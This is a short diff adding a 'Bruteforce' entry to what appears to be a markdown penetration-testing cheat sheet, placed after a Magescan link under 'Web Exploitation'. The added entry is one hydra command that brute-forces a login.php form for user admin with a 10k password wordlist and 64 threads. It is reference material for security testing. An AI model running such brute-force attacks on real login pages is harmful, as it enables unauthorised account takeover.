@@ -341,3 +341,12 @@ Web Exploitation
 -    MAGENTO  
      [Magescan](https://github.com/steverobbins/magescan)
 <br>
+
+`Bruteforce`
+
+-    hydra  
+     `hydra -l admin -P /usr/share/wordlists/password/10k <RHOST> http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -t 64`
+     
+<br>
+Post Exploitation Linux
+===============================================================================================
